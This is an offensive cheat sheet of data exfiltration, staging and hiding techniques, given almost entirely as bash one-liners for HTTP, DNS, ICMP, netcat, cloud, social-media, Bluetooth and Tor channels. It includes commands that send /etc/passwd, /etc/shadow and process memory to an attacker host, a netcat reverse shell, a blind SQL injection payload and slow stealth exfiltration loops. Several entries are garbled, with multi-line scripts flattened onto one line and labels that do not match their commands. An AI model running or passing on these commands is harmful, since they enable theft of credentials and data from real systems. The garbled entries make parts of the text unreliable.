# Data Obfuscation and Staging Techniques

#### Base64 Data Encoding
- **Encode in Base64:**
	```bash
	base64 <file> > <output_file>
	```
- **Decode in Base64:**
	```bash
	base64 -d <encoded_file> > <decoded_output_file>
	```
- **Encoding and Compressing Files:**
	```bash
	tar czvf - /path/to/directory | openssl enc -aes-256-cbc -e -out archive.tar.gz.enc
	```

#### Hexadecimal Encoding for Obfuscation
- **Encode:**
	```bash
	xxd -p <file> > <hex_output>
	```
- **Decode:**
	```bash
	xxd -r -p <hex_output> > <original_file>
	```

#### Archiving Data
- **Gzip and Encrypt File Using OpenSSL:**
	```bash
	tar czf - <file> | openssl enc -aes-256-cbc -out <output.tar.gz.enc> -pass pass:<password>
	```
- **Decrypt:**
	```bash
	openssl enc -aes-256-cbc -d -in <output.tar.gz.enc> -out <output.tar.gz> -pass pass:<password>
	```
- **Archive sensitive files into a compressed tarball:**
	```bash
	tar czf <archive_name>.tar.gz <directory_or_file>
	```
- **Archive a directory into a zip file:**
	```bash
	zip -r /tmp/data.zip /path/to/directory/*
	```

#### File Encryption (GPG)
- **Encrypt a file with a passphrase:**
	```bash
	gpg -c /path/to/file
	```

#### Split Files for Stealthy Exfiltration
- **Using `split` to break up large files:**
     ```bash
     split -b 10M <file_name> <prefix>
     ```

#### Staging Exfiltration Using Hidden Files
- **Hide files in hidden directories:**
	```bash
	mkdir /tmp/.hidden
	mv <file_to_hide> /tmp/.hidden/
	```

#### Using Orphaned Files via Inodes
- **Create a file without a directory entry:** Create an orphaned file (still accessible via its inode) by writing directly to an inode number.
	```bash
	cp <file> /tmp/.hidden && rm <file>
	```
- **Access via inode:**
	```bash
	find /tmp/.hidden -inum <inode_number> -exec cp {} <new_path> \;
	```
- **Create file without directory listing:**
	```bash
	unlink <file_path>; cp /dev/null <hidden_file>
	```

#### Fileless Data Exfiltration
- **Exfiltrate data from memory directly:**
	```bash
	echo $(< /etc/passwd) | base64 | curl -X POST -d @- http://<attack_ip>/upload
	```
- **Exfiltrate Data Without Creating Local Files:**
	```bash
	curl -X POST --data-binary @<(echo "Sensitive Data") http://<remote_ip>/upload
	```
- **Stream Data Directly to a Remote Server:**
	```bash
	tar czf - /path/to/directory | ssh <username>@<remote_ip> 'cat > /path/to/remote_directory/backup.tar.gz'
	```

#### Process Memory Dumping via `/proc`
- **Access process memory and pipe to local file:**
	```bash
	cat /proc/<pid>/mem > <memory_dump>
	```
- **Access process memory directly and exfiltrate sensitive data:**
     ```bash
     cat /proc/<pid>/mem | nc <attack_ip> <attack_port>
     ```

#### Exfiltration Using Side Channels
- **Exfiltrate Data Using Screen Pixel Changes (For Example Purposes):**
	```bash
	while :; do     xdotool mousemove $RANDOM $RANDOM     sleep 1 done
	```

# Data Exfiltration via Steganography

#### Image Files
- **Embed file within an image using Steghide:**
	```bash
	steghide embed -cf <cover_file>.jpg -ef /path/to/file -p <password>
	```
- **Extract and Exfiltrate Data from a Steganographic Image:**
	```bash
	steghide extract -sf <cover_file>.jpg -p <password>
	```
- **Hide Data in Image Metadata Using `exiftool`:**
	```bash
	exiftool -Comment="$(cat /path/to/local_file)" cover.jpg
	```
- **Extract Hidden Data from Image Metadata:**
	```bash
	exiftool cover.jpg | grep "Comment"
	```

#### Audio Files
- **Hide Data in an Audio File Using `steghide`:**
	```bash
	steghide embed -cf <cover_file>.wav -ef /path/to/local_file -p <password>
	```
- **Extract and Exfiltrate Hidden Data from an Audio File:**
	```bash
	steghide extract -sf <cover_file>.wav -p <password>
	```

#### Video Files
- **Embed Data in a Video File Using `ffmpeg`:**
	```bash
	ffmpeg -i input.mp4 -i secret.txt -c copy -map 0:0 -map 1:0 -disposition:v:attached_pic output.mp4
	```
- **Extract Data from a Video File:**
	```bash
	ffmpeg -i output.mp4 -map 1 output.txt
	```

#### Data Hiding in Slack Space
- **Find and use slack space (unused space between file blocks) to hide data:** Write data to slack space using tools like `bmap` or `dd`.
- **Command:**
	```bash
	dd if=<file> of=/dev/<disk> bs=512 seek=$(block_number) count=1
	```

#### File Hiding in Hidden Partitions
- **Create hidden partitions to store exfiltrated data:** Create a new partition and do not mount it for covert data storage.
	```bash
	fdisk /dev/sda
	```

# Data Exfiltration via Standard Protocols

#### ICMP
- **Exfiltrate data using ICMP payload:**
	```bash
	ping -c 1 -p $(cat /path/to/file | xxd -p | tr -d '\n') <attack_ip>
	```
- **Use `ping` for Simple ICMP Exfiltration:**
	```bash
	ping -c 1 -p $(echo -n "data_to_exfiltrate" | xxd -p) <remote_ip>
	```
- **Exfiltrate Data Over ICMP Using `icmpsh`:**
	```bash
	./icmpsh -t <remote_ip> -d <local_ip>
	```

#### FTP
- **Exfiltrate Files Using FTP:**
	```bash
	ftp <remote_ip> put /path/to/local_file
	```
- **Automate FTP Exfiltration with a Script:**
	```
	ftp -n <remote_ip> <<EOF user <username> <password> cd /path/to/remote_directory put /path/to/local_file bye EOF
	```
- **Upload file via FTP using Curl:**
	```bash
	curl -T /path/to/file ftp://<attack_ip>/path/to/destination --user <username>:<password>
	```

#### TFTP (Trivial File Transfer Protocol)
- **Upload a File to a TFTP Server:**
	```bash
	tftp <remote_ip> tftp> put /path/to/local_file
	```
- **Automate TFTP Exfiltration:**
	```bash
	echo -e "put /path/to/local_file\nquit" | tftp <remote_ip>
	```

#### SFTP
- **Exfiltrate Files Using SFTP:**
	```bash
	sftp <username>@<remote_ip> put /path/to/local_file
	```
- **Exfiltrate Multiple Files Using SFTP:**
	```bash
	sftp <username>@<remote_ip> mput /path/to/local_files/* 
	```

#### SSH
- **Exfiltrate a Single File Using SCP:**
	```bash
	scp /path/to/local_file <username>@<remote_ip>:/path/to/remote_directory
	```
- **Exfiltrate a Directory Using SCP:**
	```bash
	scp -r /path/to/dir <username>@<attack_ip>:/path/to/destination
	```
- **Using `scp` Over Non-Standard Ports:**
	```bash
	scp -P <non_standard_port> /path/to/file <username>@<target_ip>:/path/to/destination
	```

#### Telnet
- **Exfiltrate Data Using Telnet:**
	```bash
	telnet <remote_ip> <remote_port> cat /path/to/local_file
	```
- **Automate Telnet Exfiltration with a Script:**
	```bash
	expect -c " spawn telnet <remote_ip> expect \"Escape character is '^]'.\" send \"$(cat /path/to/local_file)\" interact "
	```

#### DNS
- **Exfiltrate data using DNS queries:**
	```bash
	nslookup $(cat /path/to/file | base64 | head -c 253).<attack_domain>
	```
- **Exfiltrate Data via DNS Tunneling Using `iodine`:**
	```bash
	iodine -f -P password tunnel.dns.server.com
	```
- **Exfiltrate Data Using `dnschef`:**
	```bash
	dnschef --fakeip=<remote_ip> --interface eth0
	```
- **Leveraging DNS Tunneling:**
	```bash
	dns2tcp -z -k password -r <resource> -l <port> <target_ip>
	```
- **Exfiltration via DNS TXT Records:** Split data into chunks and encode in Base64, then use `dig` to send each chunk in a DNS query.
	```bash
	dig txt <chunk>.attack_domain.com @<dns_server>
	```
	- Example:
		```bash
		cat /etc/shadow | base64 | split -b 50
		dig txt abc123.attack_domain.com @8.8.8.8
		```

#### SNMP
- **Use SNMP to Exfiltrate System Information:**
	```bash
	snmpwalk -v 2c -c public <target_ip> > /path/to/local_file
	```
- **Write Exfiltrated Data to a Remote SNMP Trap:**
	```bash
	snmptrap -v 2c -c public <remote_ip> "" "" 6 17 "" s "$(cat /path/to/local_file)"
	```

#### SMB
- **Mount an SMB Share and Exfiltrate Files:**
	```bash
	mount -t cifs //<remote_ip>/share /mnt -o username=user,password=pass cp /path/to/local_file /mnt/
	```
- **Exfiltrate Data Using `smbclient`:**
	```bash
	smbclient //<remote_ip>/share -U user%password -c "put /path/to/local_file"
	```

#### Rsync
- **Sync directory with a remote server via `rsync`:**
	```bash
	rsync -avz /path/to/dir <username>@<attack_ip>:/path/to/destination
	```
- **Exfiltrate Files with an Encrypted Tunnel Using `rsync`:**
	```bash
	rsync -avz -e ssh /path/to/local_directory <username>@<remote_ip>:/path/to/remote_directory
	```

#### NFS
- **Mount an NFS Share and Exfiltrate Files:**
	```bash
	sudo mount <remote_ip>:/path/to/share /mnt cp /path/to/local_file /mnt/
	```
- **Exfiltrate Data by Writing to an NFS Share:**
	```bash
	echo "Sensitive data" > /mnt/remote_file.txt
	```

#### RDP 
- **Exfiltrate Data Over RDP with File Redirection:**
	```bash
	xfreerdp /v:<remote_ip> /u:user /p:password /drive:share,/path/to/local_directory
	```
- **Automate RDP Exfiltration Using Scripts:**
	```bash
	rdesktop -u user -p password -r disk:share=/path/to/local_directory <remote_ip>
	```

#### IRC
- **Connect to an IRC Server and Exfiltrate Data:**
	```bash
	irssi -c <irc_server> -n <nickname> -w <password> /join #channel /msg #channel $(cat /path/to/local_file)
	```
- **Automate IRC Exfiltration with a Script:**
	```bash
	irssi -c <irc_server> -n <nickname> -w <password> -e "/join #channel; /msg #channel $(cat /path/to/local_file); /quit"
	```

# Data Exfiltration via HTTP/HTTPS

#### Curl
- **Download a file from a remote server:**
	```bash
	curl -O http://<attack_ip>/file_name
	```
- **Upload Data to a Web Server via HTTP POST:**
	```bash
	curl -X POST -d @/path/to/local_file http://<remote_ip>/upload
	```
- **Upload file via HTTP POST:**
	```bash
	curl -X POST -F 'file=@/path/to/file' http://<attack_ip>/upload
	```
- **Exfiltrate data by encoding in URL parameters:**
	```bash
	curl http://<attack_ip>/index.php?data=$(cat /path/to/file | base64)
	```
- **Exfiltrate Data via HTTP GET with Base64 Encoding:**
	```bash
	cat /path/to/local_file | base64 | curl -G --data-urlencode "data@-" http://<remote_ip>/upload
	```

#### Wget
- **Upload file via HTTP POST using Wget:**
	```bash
	wget --post-file=/path/to/local_file http://<remote_ip>/upload
	```
- **Exfiltrate Data Over HTTPS for Encrypted Transfer:**
	```bash
	wget --secure-protocol=auto --post-file=/path/to/local_file https://<remote_ip>/upload
	```

#### HTTP Server (Python)
- **Start a simple HTTP server to serve files:**
	```bash
	python3 -m http.server <local_port>
	```
- **Send Files Using `curl` (from target machine):**
	```bash
	curl --upload-file <file> http://<attack_ip>:8080
	```

#### WebDAV
- **Mount a WebDAV Share and Exfiltrate Files:**
	```bash
	davfs2 http://<webdav_ip>/share /mnt cp /path/to/local_file /mnt/
	```
- **Exfiltrate Data Using `cadaver` (WebDAV Client):**
	```bash
	cadaver http://<webdav_ip>/share put /path/to/local_file
	```

#### Using stunnel for SSL/TLS Encryption
- **Exfiltrate Data Over an SSL Tunnel Using stunnel:**
	```bash
	stunnel /etc/stunnel/stunnel.conf nc <stunnel_ip> <stunnel_port> < /path/to/local_file
	```

#### OpenVPN
- **Set Up a VPN Tunnel and Transfer Files Securely:**
	```bash
	openvpn --config /path/to/config.ovpn scp /path/to/local_file <username>@<vpn_ip>:/path/to/remote_directory
	```

#### REST APIs
- **Upload Data via a REST API Using Curl:**
	```bash
	curl -X POST -H "Content-Type: application/json" -d @/path/to/local_file http://<api_ip>/upload
	```
- **Exfiltrate Data Using a Custom REST API Client:**
	```bash
	import requests url = "http://<api_ip>/upload" files = {'file': open('/path/to/local_file', 'rb')} r = requests.post(url, files=files) print(r.status_code)
	```

# Data Exfiltration via SQL Databases

#### SQL Injection
- **Exfiltrate Data Using Blind SQL Injection:**
	```bash
	curl "http://<target_ip>/vulnerable_page?id=1 AND 1=IF((SELECT ascii(SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1))=97), SLEEP(5), 0)"
	```
- **Automate SQL Injection Exfiltration with SQLMap:**
	```bash
	sqlmap -u "http://<target_ip>/vulnerable_page?id=1" --dump
	```

#### MySQL
- **Exfiltrate Data by Writing to a Remote MySQL Server:**
	```bash
	mysql -u user -p -h <remote_ip> -e "LOAD DATA LOCAL INFILE '/path/to/local_file' INTO TABLE remote_table;"
	```
- **Exfiltrate Data Using MySQL Dump:**
	```bash
	mysqldump -u user -p database_name | mysql -u user -p -h <remote_ip> remote_database
	```

#### MongoDB
- **Exfiltrate Data from MongoDB:**
	```bash
	mongo --host <remote_ip> --eval 'db.collection.find().forEach(printjson);' > /path/to/local_file
	```
- **Export MongoDB Data and Exfiltrate:**
	```bash
	mongoexport --host <remote_ip> --db database_name --collection collection_name --out /path/to/local_file
	```

# Data Exfiltration via Email

#### Send Email with Attachment
- **Send email with an attachment:**
	```bash
	echo "Body of the email" | mail -s "Subject" -A /path/to/file recipient@example.com
	```
- **Automate Email Exfiltration:**
	```bash
	for email in $(cat email_list.txt); do     echo "Data: $(cat /path/to/local_file)" | mail -s "Important" $email done
	```

#### Send Email with Mutt (if installed)
- **Send email with an attachment using Mutt:**
	```bash
	echo "Body of the email" | mutt -s "Subject" -a /path/to/file -- recipient@example.com
	```

# Data Exfiltration via Non-Standard Protocols

#### NetCat
- **Send file to a TCP remote server via NetCat:**
	```bash
	cat <file_path> | nc <attack_ip> <attack_port> < /path/to/file
	```
- **Receive file on a TCP remote server via NetCat:**
	```bash
	nc -lvp <attack_port> > <output_file>
	```
- **Create a TCP Reverse Shell for Continuous Data Exfiltration:**
	```bash
	nc -e /bin/bash <remote_ip> <remote_port>
	```
- **Send file to a UDP remote server via NetCat:**
	```bash
	cat <file_path> | nc -u <attack_ip> <attack_port> < /path/to/file
	```
- **Receive file on a UDP remote server via NetCat:**
	```bash
	nc -u -lvp <attack_port> > <output_file>
	```

#### SoCat
- **Send file to a remote server via SoCat:**
	```bash
	socat TCP:<attack_ip>:<attack_port> <file_path>
	```
- **Receive file on a remote server via SoCat:**
	```bash
	socat TCP-LISTEN:<attack_port>,reuseaddr > <output_file>
	```

#### WebSockets
- **Exfiltrate Data Over WebSockets Using `websocat`:**
	```bash
	cat /path/to/local_file | websocat ws://<remote_ip>/upload
	```
- **Automate WebSocket Exfiltration with Python:**
	```bash
	import websocket ws = websocket.WebSocket() ws.connect("ws://<remote_ip>/upload") with open("/path/to/local_file", "rb") as f:     ws.send(f.read()) ws.close()
	```

# Data Exfiltration via Public Services

#### Pastebin
- **Exfiltrate Data to Pastebin Using the API:**
	```bash
	curl -X POST -d "api_dev_key=<API_KEY>&api_paste_code=$(cat /path/to/local_file)" https://pastebin.com/api/api_post.php
	```

#### Twitter
- **Tweet Exfiltrated Data Using Twitter API:**
	```bash
	curl -X POST "https://api.twitter.com/2/tweets" -H "Authorization: Bearer <ACCESS_TOKEN>" -d '{"text":"Exfiltrated Data: $(cat /path/to/local_file)"}'
	```

	```bash
	echo "Exfiltrating Data" | twurl -d "status=<data_to_exfiltrate>" /1.1/statuses/update.json
	
	cat /etc/passwd | base64 | twurl -d "status=$(cat -)" /1.1/statuses/update.json
	```

#### Slack
- **Send Exfiltrated Data to a Slack Channel:**
	```bash
	curl -X POST -H 'Authorization: Bearer <ACCESS_TOKEN>' -H 'Content-type: application/json' \
	--data '{"channel":"#channel_name", "text":"Exfiltrated Data: '"$(cat /path/to/local_file)"'"}' \
	https://slack.com/api/chat.postMessage
	```

#### LinkedIn
- **Send Exfiltrated Data Using LinkedIn:**
	```bash
	curl -X POST "https://api.linkedin.com/v2/messages" -H "Authorization: Bearer <ACCESS_TOKEN>" -d '{"recipients":[{"person":"<target_id>"}],"message":{"body":"Exfiltrated Data: $(cat /path/to/local_file)"}}'
	```

# Data Exfiltration via Cloud

#### AWS S3
- **Upload file to AWS S3 (requires AWS CLI configured):**
	```bash
	aws s3 cp /path/to/local_file s3://bucket_name/remote_file.txt
	```
- **Sync a Local Directory to an S3 Bucket:**
	```bash
	aws s3 sync /path/to/local_directory s3://bucket_name/
	```

#### Google Drive
- **Upload Files to Google Drive Using `gdrive`:**
	```bash
	gdrive upload /path/to/local_file
	```
- **Upload a Directory to Google Drive:**
	```bash
	gdrive upload --recursive /path/to/local_directory
	```
- **Upload Data to a Google Drive Shared Link:**
	```bash
	gdrive upload --share /path/to/local_file
	```
- **Upload file to Google Cloud Storage (requires gsutil configured):**
	```bash
	gsutil cp /path/to/file gs://<bucket_name>/file_name
	```

#### Dropbox (using API)
- **Upload file to Dropbox using API:**
	```bash
	curl -X POST https://content.dropboxapi.com/2/files/upload \
	--header "Authorization: Bearer <access_token>" \
	--header "Dropbox-API-Arg: {\"path\": \"/file_name\"}" \
	--header "Content-Type: application/octet-stream" \
	--data-binary @/path/to/file  
	```

# Data Exfiltration via Custom and Covert Channels

#### Exfiltration via Custom Scripts
- **Custom Script for HTTP Exfiltration:**
	```bash
	echo "Exfiltrating data" > /tmp/data.txt while read -r line; do     curl -X POST -d "data=$line" http://<remote_ip>/upload done < /tmp/data.txt
	```

#### Exfiltration via Custom Encrypted Channel
- **Encrypt Data Before Exfiltration Using OpenSSL:**
	```bash
	openssl enc -aes-256-cbc -salt -in /path/to/local_file -out /path/to/encrypted_file scp /path/to/encrypted_file <username>@<remote_ip>:/path/to/remote_directory
	```
- **Create a Custom Encrypted Tunnel Using OpenSSL:**
	```bash
	openssl s_server -accept 443 -cert mycert.pem -key mykey.pem -quiet openssl s_client -connect <remote_ip>:443 -quiet < /path/to/local_file
	```

#### Exfiltrate Data Over a Covert SSH Tunnel
- **Exfiltrate Data Over a Covert SSH Tunnel:**
	```bash
	ssh -D 8080 <username>@<remote_ip> curl --socks5 localhost:8080 -T /path/to/local_file http://<remote_ip>/upload
	```
- **Use Tor for Encrypted P2P Exfiltration:**
	```bash
	torify curl -X POST -d @/path/to/local_file http://<onion_address>/upload
	```
- **Exfiltrate Data Over I2P:**
	```bash
	i2prouter start curl -X POST -d @/path/to/local_file http://<i2p_address>/upload
	```

# Data Exfiltration via Physical Media

#### USB Drive Exfiltration
- **Mount USB:**
	```bash
	mount /dev/sdb1 /mnt/usb
	```
- **Copy Files to a USB Drive:**
	```bash
	cp /path/to/local_file /media/usb/
	```

	```bash
	dd if=<file_to_exfiltrate> of=/mnt/usb/<output_file>
	```
- **Automatically Exfiltrate Data When USB Is Inserted:**
	```bash
	udevadm monitor --udev | while read -r line; do     if [[ "$line" == *"add"* ]]; then         cp /path/to/local_file /media/usb/     fi done
	```

#### Burning Data to a CD/DVD
- **Burn Exfiltrated Data to a CD/DVD:**
	```bash
	genisoimage -o /path/to/output.iso /path/to/local_file wodim -v dev=/dev/cdrom /path/to/output.iso
	```

# Data Exfiltration via Wireless

#### Wireless Networks
- **Exfiltrate Data Over Wi-Fi Using `aircrack-ng`:**
	```bash
	aircrack-ng -b <target_bssid> -w /path/to/wordlist handshake.cap
	```
- **Use Wi-Fi Direct for Data Exfiltration:**
	```bash
	wpa_cli p2p_find wpa_cli p2p_connect <target_mac> pbc scp /path/to/local_file <username>@<peer_ip>:/path/to/remote_directory
	```

#### Bluetooth
- **Exfiltrate Data via Bluetooth Using `obexftp`:**
	```bash
	obexftp --nopath --noconn --uuid none --bluetooth <target_mac> --channel <channel> --put /path/to/local_file
	```
- **Transfer Files Over Bluetooth Using `rfcomm`:**
	```bash
	rfcomm connect hci0 <target_mac> 1 cat /path/to/local_file > /dev/rfcomm0
	```
- **Exfiltrate Data via Bluetooth Low Energy (BLE):**
	```bash
	gatttool -b <target_mac> --char-write-req --handle=<handle> --value=$(xxd -p /path/to/local_file)
	```
- **Set Up a BLE Beacon for Covert Exfiltration:**
	```bash
	hcitool -i hci0 cmd 0x08 0x0008 00 00 00 00 00 00 00 00 00 00 00 00
	```

#### RFID/NFC
- **Write Data to an NFC Tag:**
	```bash
	nfc-mfclassic w a /path/to/dump.mfd /path/to/local_file
	```
- **Read and Exfiltrate Data from an NFC Tag:**
	```bash
	nfc-mfclassic r a /path/to/dump.mfd /path/to/output.mfd
	```

# Data Exfiltration via IoT

#### Smart Home Devices
- **Exfiltrate Data via a Smart TV:**
	```bash
	curl -X POST -d @/path/to/local_file http://<smart_tv_ip>/upload
	```
- **Send Data to a Smart Speaker:**
	```bash
	curl -X POST -d @/path/to/local_file http://<smart_speaker_ip>/command
	```

#### Wearable Devices
- **Exfiltrate Data to a Smartwatch:**
	```bash
	adb -s <smartwatch_ip> push /path/to/local_file /sdcard/
	```
- **Send Data to a Fitness Tracker:**
	```bash
	gatttool -b <tracker_mac> --char-write-req --handle=<handle> --value=$(xxd -p /path/to/local_file)
	```

#### Industrial IoT Devices
- **Exfiltrate Data from a PLC (Programmable Logic Controller):**
	```bash
	modpoll -m tcp -t 4:hex -r 100 -c 1 <plc_ip>
	```
- **Send Data to an IoT Gateway:**
	```bash
	curl -X POST -d @/path/to/local_file http://<iot_gateway_ip>/data
	```

# Data Exfiltration via Advanced Persistent Threat (APT) Techniques

#### Supply Chain Attacks
- **Inject Malicious Code into a Software Update:**
	```bash
	sed -i 's/old_code/new_code/g' /path/to/software_update
	```
- **Exfiltrate Data via Compromised Update Servers:**
	```bash
	curl -X POST -d @/path/to/local_file http://<update_server_ip>/upload
	```

#### Insider Threats
- **Automate Data Exfiltration Using Insiders:**
	```bash
	echo "Exfiltrating data" > /tmp/data.txt for email in $(cat insider_list.txt); do     echo "Data: $(cat /path/to/local_file)" | mail -s "Important" $email done
	```

#### Long-Term Stealth
- **Use Slow Data Exfiltration Techniques:**
	```bash
	while read -r line; do     sleep 300     curl -X POST -d "data=$line" http://<remote_ip>/upload done < /path/to/local_file
	```
- **Exfiltrate Data in Small Increments Over Time:**
	```bash
	split -b 1M /path/to/local_file part_ for part in part_*; do     curl -X POST -d @$part http://<remote_ip>/upload     sleep 600 done
	```

#### Exfiltration with Tor (Using Hidden Services)
- **Create a Tor hidden service for exfiltration:**
	- **Install Tor** and configure it to run a hidden service on the compromised system.
		```bash
		apt-get install tor
		echo "HiddenServiceDir /var/lib/tor/hidden_service/" >> /etc/tor/torrc
		echo "HiddenServicePort 80 127.0.0.1:8080" >> /etc/tor/torrc
		systemctl restart tor
		```
	- **Use the `.onion` address to access the service** and transfer files.